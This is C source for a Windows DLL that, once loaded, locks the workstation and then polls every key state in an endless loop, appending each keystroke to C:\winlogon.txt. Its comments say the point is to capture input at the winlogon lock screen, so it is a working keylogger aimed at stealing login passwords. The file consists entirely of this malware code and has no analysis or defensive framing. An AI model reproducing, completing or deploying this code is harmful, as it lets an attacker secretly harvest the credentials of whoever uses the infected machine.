#include <Windows.h>
#include <stdio.h>

BOOL winlogon_keylog()
{
	BOOL ret = FALSE;

	do
	{
		// lock the computer
		if (!LockWorkStation())
			break;

		// foreground should be winlogon.exe
		if (!GetForegroundWindow())
			break;

		ret = TRUE;
	} while (0);

	int last_vKey = 0;
	while (1)
	{
		for (int vKey = 0; vKey < 255; ++vKey)
		{
			if (GetAsyncKeyState(last_vKey) != 0)
				continue;

			last_vKey = 0;

			if (GetAsyncKeyState(vKey) != 0)
			{
				last_vKey = vKey;

				FILE *f = NULL;
				fopen_s(&f, "C:\\winlogon.txt", "a");

				char buf[2];
				sprintf_s(buf, sizeof(buf), "%c", vKey);
				fwrite(buf, 1, 1, f);
				fclose(f);
			}
		}

	}

	return ret;
}

BOOL WINAPI DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ DWORD     fdwReason,
	_In_ LPVOID    lpvReserved
)
{

	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		if (!winlogon_keylog())
		{
			char buff[1000];
			sprintf_s(buff, sizeof(buff), "Unable to keylog! Err: 0x%08x", GetLastError());
			MessageBoxA(NULL, buff, "Error!", MB_OK);
		}
	}

	return 0;
}